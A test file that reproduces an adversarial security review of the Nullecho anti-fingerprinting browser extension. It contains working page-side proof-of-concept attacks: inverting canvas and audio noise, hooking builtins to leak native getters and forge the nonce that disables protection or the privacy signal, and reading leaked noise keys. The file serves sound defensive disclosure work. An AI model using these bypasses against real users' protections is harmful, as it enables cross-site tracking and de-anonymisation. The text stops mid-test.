/**
 * Nullecho — adversarial review, 2026-09-16: REPRODUCTIONS
 * ═════════════════════════════════════════════════════════
 * Companion to docs/REVIEW-2026-09-16.md. Every test here is a reproduction of a
 * finding in that document, run against the REAL shipped sources (`shim.js`,
 * `gpc.js`, `shim-loader.js`, `heuristics.js`, `background.js`) in `node:vm`
 * realms, with a fake DOM just large enough to be honest about.
 *
 * ⚠ READ THIS BEFORE "FIXING" A RED TEST. These tests PASS while the defect is
 * present. They assert what a hostile page can do TODAY. When a finding is fixed,
 * the matching test is supposed to go red — at that point either flip its
 * assertion into a regression guard (preferred) or delete it. A green run of this
 * file is not good news; it is the review still being true.
 *
 * Fidelity notes, so nobody over-reads a result:
 *   · Fake DOM classes are defined INSIDE the vm realm (see DOM_SETUP), not in the
 *     Node realm. That matters: several findings hook `Function.prototype.call`,
 *     `String.prototype.charCodeAt`, `Math.imul` or `%TypedArray%.prototype.length`
 *     in the page's realm, and the shim's own calls only resolve to those hooks if
 *     the objects it touches belong to that same realm — as they do in a browser.
 *   · Canvas / audio contexts are pixel/sample buffers with the exact method
 *     shapes the shim calls. The noise kernels under test are pure JS in shim.js,
 *     so what these tests measure IS what a browser would apply.
 *   · Nothing here proves anything about the document_start race, CSS, Workers,
 *     or HTTP headers. Those findings are in the "unconfirmed" section of the doc.
 *
 * Run: `node --test` from `ext/`.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { execFileSync } from 'node:child_process';
import { webcrypto } from 'node:crypto';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const EXT = path.resolve(HERE, '..');
const src = (f) => fs.readFileSync(path.join(HERE, f), 'utf8');
const SHIM_SRC = src('shim.js');
const GPC_SRC = src('gpc.js');
const LOADER_SRC = src('shim-loader.js');

// ═══════════════════════════════════════════════════════════════════════════
// Extension-API stubs, so background.js / heuristics.js can be imported.
// (Same shape as background.test.js; each test file is its own process.)
// ═══════════════════════════════════════════════════════════════════════════

const store = {};
const dynamicRuleCalls = [];
const dynamicRules = new Map();
const onMessage = [];
const webRequestListeners = {};
const evt = (name) => ({ addListener(fn) { webRequestListeners[name] = fn; } });

globalThis.chrome = {
  runtime: {
    id: 'review',
    getURL: (p) => `file://${path.join(EXT, p)}`,
    onMessage: { addListener: (fn) => onMessage.push(fn) },
    onInstalled: { addListener() {} },
    onStartup: { addListener() {} },
  },
  storage: {
    local: {
      async get(keys) {
        const list = Array.isArray(keys) ? keys : [keys];
        const out = {};
        for (const k of list) if (k in store) out[k] = store[k];
        return out;
      },
      async set(obj) { Object.assign(store, structuredClone(obj)); },
    },
  },
  alarms: { onAlarm: { addListener() {} }, async create() {}, async clear() {} },
  webRequest: {
    onBeforeRequest: evt('onBeforeRequest'),
    onBeforeSendHeaders: evt('onBeforeSendHeaders'),
    onHeadersReceived: evt('onHeadersReceived'),
  },
  declarativeNetRequest: {
    async getDynamicRules() { return [...dynamicRules.values()]; },
    async updateDynamicRules(arg) {
      dynamicRuleCalls.push(arg);
      for (const id of arg.removeRuleIds ?? []) dynamicRules.delete(id);
      for (const r of arg.addRules ?? []) dynamicRules.set(r.id, r);
    },
    async getEnabledRulesets() { return ['ads', 'analytics', 'social', 'fingerprinting', 'gpc']; },
    async updateEnabledRulesets() {},
    async updateStaticRules() {},
    async getDisabledRuleIds() { return []; },
    async getMatchedRules() { return { rulesMatchedInfo: [] }; },
  },
};

const BG = await import('./background.js');
const H = await import('./heuristics.js');
const { personaFor, PERSONAS } = await import('./personas.js');

/** Send one message through the real service-worker listener. */
const swMessage = (message, sender) => new Promise((resolve) => {
  const ret = onMessage[0](message, sender, resolve);
  if (ret !== true) resolve(undefined);
});

// ═══════════════════════════════════════════════════════════════════════════
// A page realm. Everything the shim touches is defined INSIDE the realm.
// ═══════════════════════════════════════════════════════════════════════════

const REAL_UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36';
const REAL_RENDERER = 'ANGLE (Apple, ANGLE Metal Renderer: Apple M2 Max, Unspecified Version)';

const DOM_SETUP = `
(() => {
  const listeners = new WeakMap();
  const listenersFor = (t) => { let l = listeners.get(t); if (!l) { l = []; listeners.set(t, l); } return l; };
  const brand = (self, C) => { if (!(self instanceof C)) throw new TypeError('Illegal invocation'); };

  class EventTarget {
    addEventListener(type, fn, capture) { listenersFor(this).push({ type, fn, capture: !!capture }); }
    removeEventListener(type, fn, capture) {
      const l = listenersFor(this);
      const i = l.findIndex((x) => x.type === type && x.fn === fn && x.capture === !!capture);
      if (i >= 0) l.splice(i, 1);
    }
    dispatchEvent(ev) {
      // window (capture only) → document; same-phase listeners in registration order.
      for (const node of [globalThis, document]) {
        for (const l of listenersFor(node).slice()) {
          if (l.type !== ev.type) continue;
          if (node === globalThis && !l.capture) continue;
          if (ev._stoppedImmediate) break;
          l.fn.call(node, ev);
        }
        if (ev._stopped || ev._stoppedImmediate) break;
      }
      return true;
    }
  }
  class Event {
    constructor(type) { this.type = type; this._stopped = false; this._stoppedImmediate = false; }
    stopPropagation() { this._stopped = true; }
    stopImmediatePropagation() { this._stopped = true; this._stoppedImmediate = true; }
  }
  class CustomEvent extends Event {
    constructor(type, init) { super(type); this._detail = init ? init.detail : undefined; }
  }
  Object.defineProperty(CustomEvent.prototype, 'detail', {
    get() { return this._detail; }, configurable: true, enumerable: true,
  });

  // ── navigator ────────────────────────────────────────────────────────────
  const REAL = {
    userAgent: ${JSON.stringify(REAL_UA)},
    appVersion: ${JSON.stringify(REAL_UA.replace(/^Mozilla\//, ''))},
    platform: 'MacIntel',
    hardwareConcurrency: 12,
    deviceMemory: 32,
    vendor: 'Google Inc.',
    maxTouchPoints: 10,
    language: 'de-DE',
    languages: Object.freeze(['de-DE', 'de', 'en']),
  };
  class Navigator {}
  for (const k of Object.keys(REAL)) {
    Object.defineProperty(Navigator.prototype, k, {
      get() { brand(this, Navigator); return REAL[k]; }, configurable: true, enumerable: true,
    });
  }
  class NavigatorUAData {}
  const UAD = {
    brands: Object.freeze([
      { brand: 'Not;A=Brand', version: '99' }, { brand: 'Chromium', version: '152' }, { brand: 'Google Chrome', version: '152' },
    ]),
    mobile: false,
    platform: 'macOS',
  };
  for (const k of Object.keys(UAD)) {
    Object.defineProperty(NavigatorUAData.prototype, k, {
      get() { brand(this, NavigatorUAData); return UAD[k]; }, configurable: true, enumerable: true,
    });
  }
  NavigatorUAData.prototype.toJSON = function () { brand(this, NavigatorUAData); return { ...UAD }; };
  NavigatorUAData.prototype.getHighEntropyValues = function () {
    brand(this, NavigatorUAData);
    return Promise.resolve({ ...UAD, platformVersion: '26.6.0', architecture: 'arm', bitness: '64' });
  };
  const uad = Object.create(NavigatorUAData.prototype);
  Object.defineProperty(Navigator.prototype, 'userAgentData', {
    get() { brand(this, Navigator); return uad; }, configurable: true, enumerable: true,
  });
  const navigator = Object.create(Navigator.prototype);

  // ── DOM elements + canvas ────────────────────────────────────────────────
  class Element extends EventTarget { getBoundingClientRect() { return { x: 0, y: 0, width: 100, height: 20 }; } }
  class HTMLElement extends Element {}
  Object.defineProperty(HTMLElement.prototype, 'offsetWidth', { get() { return 100; }, configurable: true });
  Object.defineProperty(HTMLElement.prototype, 'offsetHeight', { get() { return 20; }, configurable: true });
  class HTMLIFrameElement extends HTMLElement {}
  class MutationObserver { observe() {} disconnect() {} }
  const getComputedStyle = () => ({ fontFamily: '', fontSize: '', fontWeight: '', fontStyle: '', letterSpacing: '' });

  class CanvasRenderingContext2D {
    constructor(canvas) {
      this.canvas = canvas;
      this._buf = new Uint8ClampedArray(canvas.width * canvas.height * 4);
      this.fillStyle = 'rgb(0,0,0)'; this.font = '10px sans-serif'; this.textBaseline = 'alphabetic';
    }
    _rgba() {
      const m = /rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)(?:,\\s*([\\d.]+))?\\)/.exec(this.fillStyle);
      return m ? [+m[1], +m[2], +m[3], m[4] === undefined ? 255 : Math.round(+m[4] * 255)] : [0, 0, 0, 255];
    }
    fillRect(x, y, w, h) {
      const [r, g, b, a] = this._rgba(); const W = this.canvas.width;
      for (let yy = y; yy < y + h; yy++) for (let xx = x; xx < x + w; xx++) {
        const p = (yy * W + xx) * 4; this._buf[p] = r; this._buf[p + 1] = g; this._buf[p + 2] = b; this._buf[p + 3] = a;
      }
    }
    fillText() {}
    getImageData(sx, sy, sw, sh) {
      brand(this, CanvasRenderingContext2D);
      const W = this.canvas.width; const out = new Uint8ClampedArray(sw * sh * 4);
      for (let r = 0; r < sh; r++) for (let c = 0; c < sw; c++) {
        const s = ((sy + r) * W + (sx + c)) * 4, d = (r * sw + c) * 4;
        out[d] = this._buf[s]; out[d + 1] = this._buf[s + 1]; out[d + 2] = this._buf[s + 2]; out[d + 3] = this._buf[s + 3];
      }
      return { width: sw, height: sh, data: out };
    }
    putImageData(img, dx, dy) {
      const W = this.canvas.width;
      for (let r = 0; r < img.height; r++) for (let c = 0; c < img.width; c++) {
        const d = ((dy + r) * W + (dx + c)) * 4, s = (r * img.width + c) * 4;
        for (let k = 0; k < 4; k++) this._buf[d + k] = img.data[s + k];
      }
    }
    drawImage(srcCanvas, dx, dy) {
      const s = srcCanvas._ctx; if (!s) return;
      const W = this.canvas.width, SW = srcCanvas.width;
      for (let r = 0; r < srcCanvas.height; r++) for (let c = 0; c < SW; c++) {
        const d = ((dy + r) * W + (dx + c)) * 4, sp = (r * SW + c) * 4;
        for (let k = 0; k < 4; k++) this._buf[d + k] = s._buf[sp + k];
      }
    }
    measureText(t) { return { width: t.length * 7 }; }
  }
  class HTMLCanvasElement extends HTMLElement {
    constructor() { super(); this.width = 300; this.height = 150; this._ctx = null; }
    getContext() { if (!this._ctx) this._ctx = new CanvasRenderingContext2D(this); return this._ctx; }
    toDataURL() { brand(this, HTMLCanvasElement); return 'data:fake,' + (this._ctx ? Array.from(this._ctx._buf).join(',') : ''); }
    toBlob(cb) { cb(null); }
  }

  // ── WebGL / WebGPU ───────────────────────────────────────────────────────
  const REAL_GL = { 0x9245: 'Google Inc. (Apple)', 0x9246: ${JSON.stringify(REAL_RENDERER)}, 0x1f00: 'WebKit', 0x1f01: 'WebKit WebGL', 0x0d33: 16384 };
  class WebGLRenderingContext {
    constructor(canvas) { this.canvas = canvas; }
    getParameter(p) { brand(this, WebGLRenderingContext); return p in REAL_GL ? REAL_GL[p] : 0; }
    getSupportedExtensions() { brand(this, WebGLRenderingContext); return ['WEBGL_compressed_texture_astc', 'WEBGL_debug_renderer_info', 'OES_texture_float']; }
    getExtension(n) { brand(this, WebGLRenderingContext); return { name: n }; }
    readPixels(x, y, w, h, f, t, px) { brand(this, WebGLRenderingContext); for (let i = 0; i < px.length; i++) px[i] = 200; }
  }
  class GPUAdapterInfo {}
  const REAL_GPU = { vendor: 'apple', architecture: 'metal-3', device: '', description: '', subgroupMinSize: 32, subgroupMaxSize: 32 };
  for (const k of Object.keys(REAL_GPU)) {
    Object.defineProperty(GPUAdapterInfo.prototype, k, {
      get() { brand(this, GPUAdapterInfo); return REAL_GPU[k]; }, configurable: true, enumerable: true,
    });
  }

  // ── audio ────────────────────────────────────────────────────────────────
  class AudioBuffer {
    constructor(length, channels) {
      this.length = length; this.numberOfChannels = channels || 1; this._d = [];
      for (let c = 0; c < this.numberOfChannels; c++) this._d.push(new Float32Array(length));
    }
    getChannelData(c) { brand(this, AudioBuffer); return this._d[c]; }
    copyFromChannel(dest, c) { brand(this, AudioBuffer); dest.set(this._d[c].subarray(0, dest.length)); }
  }
  class AnalyserNode {
    constructor() { this.fftSize = 2048; }
    getFloatFrequencyData(a) { a.fill(-Infinity); }
    getByteFrequencyData(a) { a.fill(0); }
  }

  // ── document ─────────────────────────────────────────────────────────────
  const document = new EventTarget();
  document.createElement = (tag) => (String(tag).toLowerCase() === 'canvas' ? new HTMLCanvasElement() : new HTMLElement());
  document.documentElement = new HTMLElement();
  document.readyState = 'loading';
  document.scripts = { length: 0 };

  Object.assign(globalThis, {
    EventTarget, Event, CustomEvent, Navigator, navigator, NavigatorUAData,
    Element, HTMLElement, HTMLIFrameElement, HTMLCanvasElement, CanvasRenderingContext2D,
    MutationObserver, getComputedStyle, WebGLRenderingContext, GPUAdapterInfo,
    AudioBuffer, AnalyserNode, document,
  });
  globalThis.__h = { listenersFor, REAL, UAD, REAL_GL, REAL_GPU };
})();
`;

/**
 * Boot a page realm and run the real shim in it (loader's listeners in place
 * first, as the manifest order guarantees). Returns page-side and loader-side
 * handles. Nothing shimmed is read before `upgrade()` — the read gate would
 * otherwise lock the fallback in.
 */
function bootRealm({ hostname = 'example.test', origin = 'https://example.test', extraGlobals = {}, gpc = false } = {}) {
  const logs = [];
  const sandbox = {
    location: { hostname, origin },
    crypto: { getRandomValues: (a) => webcrypto.getRandomValues(a) },
    console: { log() {}, info() {}, warn: (...a) => logs.push(String(a[0])), error: (...a) => logs.push(String(a[0])) },
    setTimeout, clearTimeout, queueMicrotask,
    ...extraGlobals,
  };
  const ctx = vm.createContext(sandbox);
  vm.runInContext(DOM_SETUP, ctx, { filename: 'dom-setup.js' });
  const win = vm.runInContext('globalThis', ctx);
  const h = ctx.__h;

  const statuses = [];
  let boot = null;
  ctx.document.addEventListener('nullecho:status', (ev) => {
    const d = JSON.parse(ev.detail);
    if (d.phase === 'boot') { if (d.channel === 'shim' && !boot) boot = d; }
    else statuses.push(d);
  }, true);

  vm.runInContext(SHIM_SRC, ctx, { filename: 'shim.js' });
  if (gpc) vm.runInContext(GPC_SRC, ctx, { filename: 'gpc.js' });

  /** Dispatch a persona event exactly as the loader (or a forging page) would. */
  const send = (payload) => vm.runInContext(
    'document.dispatchEvent(new CustomEvent("nullecho:persona", { detail: __payload }))',
    Object.assign(ctx, { __payload: typeof payload === 'string' ? payload : JSON.stringify(payload) }),
  );
  /** Run page script inside the realm. */
  const page = (code) => vm.runInContext(code, ctx, { filename: 'page.js' });

  return {
    ctx, win, h, logs, boot, statuses, send, page,
    upgrade: (persona = DELIVERED, over = {}) => send({ ok: true, enabled: true, gpc: true, site: hostname, persona, nonce: boot.nonce, ...over }),
    ua: () => ctx.navigator.userAgent,
    canvas: (w, h2) => { const c = page('document.createElement("canvas")'); c.width = w; c.height = h2; return c; },
  };
}

const DELIVERED = {
  id: 'macos-chrome-m1-pro', platform: 'MacIntel',
  ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
  uaData: { platform: 'macOS', platformVersion: '14.6.0', architecture: 'arm', bitness: '64', model: '', wow64: false },
  gpu: { vendor: 'Google Inc. (Apple)', renderer: 'ANGLE (Apple, ANGLE Metal Renderer: Apple M1 Pro, Unspecified Version)', unmaskedVendor: 'Google Inc. (Apple)', maxTextureSize: 16384 },
  cores: 10, memory: 32,
  screen: { width: 2560, height: 1440, availHeight: 1415, colorDepth: 24, dpr: 1 },
  fontList: ['Helvetica'], noise: { canvas: 0.31, audio: 0.57, webgl: 0.73 }, seed: 0x0badf00d,
};
const DELIVERED_B = { ...DELIVERED, id: 'macos-chrome-m2-air', cores: 8, memory: 16, noise: { canvas: 0.62, audio: 0.11, webgl: 0.44 }, seed: 0x1234abcd };

/** Deterministic "real" pixel content: every channel in [8, 247] so no clamp-flip ambiguity. */
function paintReal(canvas, salt = 1) {
  const ctx = canvas.getContext('2d');
  let s = 0x9e3779b9 ^ salt;
  const next = () => { s ^= s << 13; s >>>= 0; s ^= s >>> 17; s ^= s << 5; s >>>= 0; return s; };
  for (let i = 0; i < ctx._buf.length; i += 4) {
    ctx._buf[i] = 8 + (next() % 240); ctx._buf[i + 1] = 8 + (next() % 240); ctx._buf[i + 2] = 8 + (next() % 240); ctx._buf[i + 3] = 255;
  }
  return Uint8ClampedArray.from(ctx._buf); // a private copy of the truth
}

const bytesEqual = (a, b) => a.length === b.length && Array.from(a).every((v, i) => v === b[i]);
/** Cross-realm objects fail deepStrictEqual on prototype identity alone; compare structure. */
const plain = (x) => JSON.parse(JSON.stringify(x));
/** Signed per-channel delta between a read and a known fill (alpha ignored). Plain array: a clamped array would swallow the negatives. */
const deltaFrom = (data, fill) => Array.from(data, (v, i) => (i % 4 === 3 ? 0 : v - fill));

// ═══════════════════════════════════════════════════════════════════════════
// A1 — content-independent noise is INVERTIBLE (canvas + audio)
// ═══════════════════════════════════════════════════════════════════════════

test('A1a REPRO: a uniform fill reveals the canvas noise pattern; subtracting it recovers the real pixels', () => {
  const s = bootRealm();
  s.upgrade();

  // The page draws a known input and reads it back: the difference IS the pattern.
  const probe = s.canvas(64, 32);
  const pc = probe.getContext('2d'); pc.fillStyle = 'rgb(128,128,128)'; pc.fillRect(0, 0, 64, 32);
  const pattern = deltaFrom(pc.getImageData(0, 0, 64, 32).data, 128);
  assert.ok(pattern.some((d) => d !== 0), 'the shim did not noise the uniform fill (nothing to invert)');

  // The real fingerprint canvas, same dimensions.
  const target = s.canvas(64, 32);
  const truth = paintReal(target);
  const noised = target.getContext('2d').getImageData(0, 0, 64, 32).data;
  assert.ok(!bytesEqual(noised, truth), 'the fingerprint read was not noised at all');

  // Subtract the learned pattern.
  const recovered = Array.from(noised, (v, i) => v - pattern[i]);
  assert.ok(bytesEqual(recovered, truth),
    'THE FINDING: real canvas bytes recovered exactly by subtracting a pattern learned from a uniform fill');
});

test('A1b REPRO: the recovered bytes are the same on two sites with different personas — the join is back', () => {
  const recoverOn = (hostname, persona) => {
    const s = bootRealm({ hostname, origin: `https://${hostname}` });
    s.upgrade(persona);
    const probe = s.canvas(64, 32);
    const pc = probe.getContext('2d'); pc.fillStyle = 'rgb(128,128,128)'; pc.fillRect(0, 0, 64, 32);
    const pattern = deltaFrom(pc.getImageData(0, 0, 64, 32).data, 128);
    const target = s.canvas(64, 32);
    paintReal(target, 7); // same "machine" draws the same real content on both sites
    const noised = target.getContext('2d').getImageData(0, 0, 64, 32).data;
    return { noised, recovered: Array.from(noised, (v, i) => v - pattern[i]) };
  };
  const a = recoverOn('news.example', DELIVERED);
  const b = recoverOn('shop.example', DELIVERED_B);
  assert.ok(!bytesEqual(a.noised, b.noised), 'sanity: the two sites were noised differently (the product working as designed)');
  assert.ok(bytesEqual(a.recovered, b.recovered),
    'THE FINDING: after subtraction both sites yield identical bytes — a cross-site canvas join');
});

test('A1c REPRO: a silent AudioBuffer returns the noise vector in the clear; subtracting it recovers the real samples', () => {
  const s = bootRealm();
  s.upgrade();
  const N = 4096;
  const silent = s.page(`new AudioBuffer(${N})`);
  const vector = Float32Array.from(silent.getChannelData(0));
  assert.ok(vector.some((v) => v !== 0),
    'B4 half: a never-written AudioBuffer read back non-zero (every real browser returns all zeros)');

  const real = s.page(`new AudioBuffer(${N})`);
  const truth = new Float32Array(N);
  for (let i = 0; i < N; i++) truth[i] = Math.sin(i / 7) * 0.5;
  real._d[0].set(truth);
  const noised = real.getChannelData(0);
  let maxNoise = 0, maxErr = 0;
  for (let i = 0; i < N; i++) {
    maxNoise = Math.max(maxNoise, Math.abs(noised[i] - truth[i]));
    maxErr = Math.max(maxErr, Math.abs((noised[i] - vector[i]) - truth[i]));
  }
  assert.ok(maxNoise >= 1e-7, 'sanity: the audio was noised');
  assert.ok(maxErr < 1e-7, `THE FINDING: real samples recovered to float32 rounding (max error ${maxErr}) — the noise is a fixed per-length vector`);
});

// ═══════════════════════════════════════════════════════════════════════════
// A2 — page hooks on uncaptured builtins reach the shim's native originals
// ═══════════════════════════════════════════════════════════════════════════

test('A2a REPRO: hooking Function.prototype.call hands the page the NATIVE navigator getters', () => {
  const s = bootRealm();
  s.upgrade();
  assert.equal(s.ua(), DELIVERED.ua, 'sanity: the persona is in place');

  const realUA = s.page(`
    const leaked = [];
    const origCall = Function.prototype.call;
    Function.prototype.call = function (thisArg, ...args) {
      leaked.push(this);
      return Reflect.apply(this, thisArg, args);
    };
    try { void navigator.userAgent; } finally { Function.prototype.call = origCall; }
    // The shim delegated to the original getter for its brand check — and passed it to us as \`this\`.
    // An attacker does not need to know which leaked function is the native one: try each against
    // navigator and keep the one that answers differently from the spoofed value.
    const spoofed = navigator.userAgent;
    const replacement = Object.getOwnPropertyDescriptor(Navigator.prototype, 'userAgent').get;
    let real = null;
    for (const fn of leaked) {
      if (fn === replacement) continue;
      try { const v = Reflect.apply(fn, navigator, []); if (typeof v === 'string' && v !== spoofed) { real = v; break; } } catch {}
    }
    real;
  `);
  assert.equal(realUA, REAL_UA, 'THE FINDING: the real userAgent was read through the shim\'s own delegation');
});

test('A2b REPRO: hooking Function.prototype.apply leaks native toDataURL and getParameter (real canvas + real GPU)', () => {
  const s = bootRealm();
  s.upgrade();
  const c = s.canvas(16, 16);
  paintReal(c);
  const out = s.page(`
    const leaked = [];
    const origApply = Function.prototype.apply;
    const origCall = Function.prototype.call;
    Function.prototype.apply = function (thisArg, args) {
      leaked.push(this);
      return origCall.call(origApply, this, thisArg, args);
    };
    const canvas = document.createElement('canvas'); canvas.width = 16; canvas.height = 16;
    const gl = new WebGLRenderingContext(canvas);
    let spoofed;
    try {
      spoofed = gl.getParameter(0x9246);
      void __c.toDataURL();
    } finally { Function.prototype.apply = origApply; }
    const nativeGetParameter = leaked.find((f) => f.name === 'getParameter' && f !== WebGLRenderingContext.prototype.getParameter);
    const nativeToDataURL = leaked.find((f) => f.name === 'toDataURL' && f !== HTMLCanvasElement.prototype.toDataURL);
    ({
      spoofed,
      real: nativeGetParameter ? Reflect.apply(nativeGetParameter, gl, [0x9246]) : null,
      realDataURL: nativeToDataURL ? Reflect.apply(nativeToDataURL, __c, []) : null,
      shimDataURL: __c.toDataURL(),
    });
  `.replace(/__c/g, '__canvasUnderTest'), Object.assign(s.ctx, { __canvasUnderTest: c }));
  assert.equal(out.spoofed, DELIVERED.gpu.renderer, 'sanity: the persona GPU was presented');
  assert.equal(out.real, REAL_RENDERER, 'THE FINDING: the real GPU renderer was read via the leaked native getParameter');
  assert.notEqual(out.shimDataURL, out.realDataURL, 'sanity: the shim noises toDataURL');
  assert.equal(out.realDataURL, 'data:fake,' + Array.from(c.getContext('2d')._buf).join(','),
    'THE FINDING: the un-noised canvas was read via the leaked native toDataURL');
});

test('A2c REPRO: hooking String.prototype.charCodeAt makes nonceMatches() accept ANY 32-char nonce → forged stand-down', () => {
  const s = bootRealm();
  s.page(`
    const orig = String.prototype.charCodeAt;
    String.prototype.charCodeAt = function () { return 0; };
    try {
      document.dispatchEvent(new CustomEvent('nullecho:persona', {
        detail: JSON.stringify({ ok: true, enabled: false, nonce: '0'.repeat(32) }),
      }));
    } finally { String.prototype.charCodeAt = orig; }
  `);
  assert.equal(s.ua(), REAL_UA,
    'THE FINDING: a page that never saw the nonce stood the shim down and got the real machine');
  assert.ok(s.statuses.some((d) => d.reason === 'allowlisted'), 'the shim even reported the forged stand-down as a legitimate allowlist');
});

test('A2d REPRO: the same charCodeAt hook deletes navigator.globalPrivacyControl through gpc.js', () => {
  const s = bootRealm({ gpc: true });
  assert.equal(s.ctx.navigator.globalPrivacyControl, true, 'sanity: gpc.js set the signal');
  s.page(`
    const orig = String.prototype.charCodeAt;
    String.prototype.charCodeAt = function () { return 0; };
    try {
      document.dispatchEvent(new CustomEvent('nullecho:persona', {
        detail: JSON.stringify({ gpc: false, gpcNonce: '0'.repeat(32), nonce: '0'.repeat(32) }),
      }));
    } finally { String.prototype.charCodeAt = orig; }
  `);
  assert.equal(s.ctx.navigator.globalPrivacyControl, undefined,
    'THE FINDING: the site the do-not-sell signal is aimed at switched it off without the nonce');
});

test('A2e REPRO: hooking %TypedArray%.prototype.length during one read skips the canvas noise entirely', () => {
  const s = bootRealm();
  s.upgrade();
  const c = s.canvas(32, 16);
  const truth = paintReal(c);
  const out = s.page(`
    const TAP = Object.getPrototypeOf(Uint8ClampedArray.prototype);
    const d = Object.getOwnPropertyDescriptor(TAP, 'length');
    Object.defineProperty(TAP, 'length', { get() { return 0; }, configurable: true });
    let img;
    try { img = __c.getContext('2d').getImageData(0, 0, 32, 16); }
    finally { Object.defineProperty(TAP, 'length', d); }
    img.data;
  `.replace(/__c/g, '__canvasUnderTest'), Object.assign(s.ctx, { __canvasUnderTest: c }));
  assert.ok(bytesEqual(out, truth), 'THE FINDING: getImageData returned the real, un-noised pixels');
  const honest = c.getContext('2d').getImageData(0, 0, 32, 16).data;
  assert.ok(!bytesEqual(honest, truth), 'sanity: without the hook the same read is noised');
});

test('A2f REPRO: hooking Math.imul makes the noise persona-independent — identical output on two sites', () => {
  const hookedRead = (hostname, persona) => {
    const s = bootRealm({ hostname, origin: `https://${hostname}` });
    s.upgrade(persona);
    const c = s.canvas(32, 16);
    paintReal(c, 3);
    const plain = Uint8ClampedArray.from(c.getContext('2d').getImageData(0, 0, 32, 16).data);
    const hooked = s.page(`
      const orig = Math.imul; Math.imul = () => 0;
      let img; try { img = __c.getContext('2d').getImageData(0, 0, 32, 16); } finally { Math.imul = orig; }
      img.data;
    `.replace(/__c/g, '__canvasUnderTest'), Object.assign(s.ctx, { __canvasUnderTest: c }));
    return { plain, hooked };
  };
  const a = hookedRead('news.example', DELIVERED);
  const b = hookedRead('shop.example', DELIVERED_B);
  assert.ok(!bytesEqual(a.plain, b.plain), 'sanity: unhooked reads differ per site');
  assert.ok(bytesEqual(a.hooked, b.hooked), 'THE FINDING: with Math.imul neutered, both sites return the same bytes');
});

// ═══════════════════════════════════════════════════════════════════════════
// A3 — the persona payload (noise keys included) is readable by the page
// ═══════════════════════════════════════════════════════════════════════════

test('A3 REPRO: the shim never stops propagation, so a page listener reads the delivered noise keys and seed', () => {
  const s = bootRealm();
  s.page(`
    globalThis.__stolen = null;
    window_capture: {
      globalThis.EventTarget.prototype.addEventListener.call(globalThis, 'nullecho:persona', (ev) => { globalThis.__stolen = JSON.parse(ev.detail); }, true);
    }
  `);
  s.upgrade();
  assert.equal(s.ua(), DELIVERED.ua, 'sanity: the shim consumed the handshake first');
  const stolen = s.ctx.__stolen;
  assert.ok(stolen, 'THE FINDING: the page listener fired at all — nothing called stopImmediatePropagation()');
  assert.deepEqual(plain(stolen.persona.noise), DELIVERED.noise, 'the per-origin noise keys were handed to the page');
  assert.equal(stolen.persona.seed, DELIVERED.seed);
});

// ═══════════════════════════════════════════════════════════════════════════
// A4 — eTLD+1 confusion: two hand-maintained suffix lists, both incomplete
// ═══════════════════════════════════════════════════════════════════════════

function shimRegistrableDomain() {
  // Lift the shim's own suffix table + function out of the source, verbatim.
  const table = /const MULTI_LABEL_SUFFIXES = new Set\(\([\s\S]*?\)\.split\('\|'\)\);/.exec(SHIM_SRC)[0];
  const fn = /function registrableDomain\(hostname\) \{[\s\S]*?\n  \}/.exec(SHIM_SRC)[0];
  return vm.runInNewContext(`${table}\n${fn}\nregistrableDomain`, {});
}

test('A4a REPRO: the service worker keys every *.myshopify.com / *.wordpress.com tenant as ONE site', () => {
  // background.js re-exports heuristics.registrableDomain and builds both the
  // persona key and the allowlist key from it.
  assert.equal(BG.siteKeyFor('https://acme-store.myshopify.com/checkout'), 'myshopify.com');
  assert.equal(BG.siteKeyFor('https://other-store.myshopify.com/'), 'myshopify.com');
  assert.equal(BG.siteKeyFor('https://alice.wordpress.com/'), 'wordpress.com');
  assert.equal(BG.siteKeyFor('https://bob.wordpress.com/'), 'wordpress.com');
  // …so two unrelated tenants get the same salted persona (no cross-site separation)…
  const salt = 'deadbeef'.repeat(4);
  assert.equal(personaFor(salt, BG.siteKeyFor('https://acme-store.myshopify.com'), 'mac').id,
    personaFor(salt, BG.siteKeyFor('https://other-store.myshopify.com'), 'mac').id);
});

test('A4b REPRO: allowlisting one Shopify store writes a DNR allowAllRequests rule for the whole suffix', async () => {
  dynamicRuleCalls.length = 0;
  const res = await swMessage({ type: 'nullecho:set-site-enabled', url: 'https://acme-store.myshopify.com/', enabled: false }, { url: 'chrome-extension://review/popup/popup.html' });
  assert.equal(res.site, 'myshopify.com', 'THE FINDING: the allowlist entry is the public suffix, not the store');
  const rule = dynamicRuleCalls.flatMap((c) => c.addRules ?? []).find((r) => r.action?.type === 'allowAllRequests');
  assert.deepEqual(rule.condition.requestDomains, ['myshopify.com'],
    'DNR requestDomains matches every subdomain → blocking AND the shim stand down on every Shopify store');
  // and the stand-down reaches every other tenant through the same key
  const other = await swMessage({ type: 'nullecho:get-persona' }, { url: 'https://other-store.myshopify.com/' });
  assert.equal(other.enabled, false, 'a store the user never touched is now unprotected');
  await swMessage({ type: 'nullecho:set-site-enabled', url: 'https://acme-store.myshopify.com/', enabled: true }, {});
});

test('A4c REPRO: the shim\'s own table lacks co.il / co.id / com.ua / com.pl / … so the fallback collapses whole ccTLDs', () => {
  const rd = shimRegistrableDomain();
  for (const [a, b] of [['ynet.co.il', 'walla.co.il'], ['detik.co.id', 'kompas.co.id'], ['pravda.com.ua', 'ukr.com.ua'], ['onet.com.pl', 'wp.com.pl']]) {
    assert.equal(rd(a), rd(b), `${a} and ${b} share one fallback key`);
    assert.equal(rd(a).split('.').length, 2, `the key is the bare public suffix ${rd(a)}`);
    assert.notEqual(H.registrableDomain(a), H.registrableDomain(b), 'while the service worker keys them apart — the two layers disagree');
  }
});

test('A4d REPRO: the two suffix tables disagree on 41 entries (no test pinned them together)', () => {
  const shimTable = /const MULTI_LABEL_SUFFIXES = new Set\(\(([\s\S]*?)\)\.split/.exec(SHIM_SRC)[1]
    .replace(/'|\+|\n|\s/g, '').split('|');
  const heurTable = /const MULTI_LABEL_SUFFIXES = new Set\(\[([\s\S]*?)\]\)/.exec(src('heuristics.js'))[1]
